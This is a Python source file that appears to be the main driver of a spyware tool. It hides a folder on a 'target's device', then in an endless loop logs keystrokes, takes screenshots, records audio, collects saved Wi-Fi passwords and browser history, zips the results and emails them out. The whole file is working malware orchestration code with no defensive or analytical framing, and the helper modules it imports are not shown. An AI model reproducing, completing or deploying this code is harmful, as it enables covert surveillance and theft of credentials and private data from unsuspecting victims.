import os
from zipfile import ZipFile
from KeyLogger import KeyLogger
from ScreenShot import ScreenShot
from SoundRecord import SoundRecord
from WifiPassword import WifiPassword
from BrowserHistory import BrowserHistory
from SendEmail import SendEmail
from threading import Thread

# main program 

# set up default hidden directory on target's device
dir = "C:\$WinConfig\Temp"
# default aduio record and key logging duration 
default_duration = 10
# emaill address and password
default_send_email_address = ""
default_receive_email_address = ""
default_email_password = ""

try: 
    os.makedirs(dir)
    os.system("attrib +h " + "C:\$WinConfig")
except FileExistsError: 
    os.system("attrib +h " + "C:\$WinConfig")

# zip the default hidden directory 
def zip_file(dir):
    zip_file = ZipFile(dir + '\data.zip', 'w')

    for filename in os.listdir(dir):
        try:  
            zip_file.write(dir + '\\' + filename)
        except:
            print('skip ' + filename)
    zip_file.close()

def task(): 
    # generate files 
    KeyLogger(default_duration,dir).run()
    ScreenShot(dir).run()
    SoundRecord(default_duration, dir).run()
    WifiPassword(dir).run()
    BrowserHistory(dir).run()
    zip_file(dir)

    # send email with the zip attachment 
    email = SendEmail(default_send_email_address, default_receive_email_address, default_email_password, dir)
    email.send()

if __name__ == '__main__':
    while True:
        t = Thread(target=task)
        t.start()
        t.join()
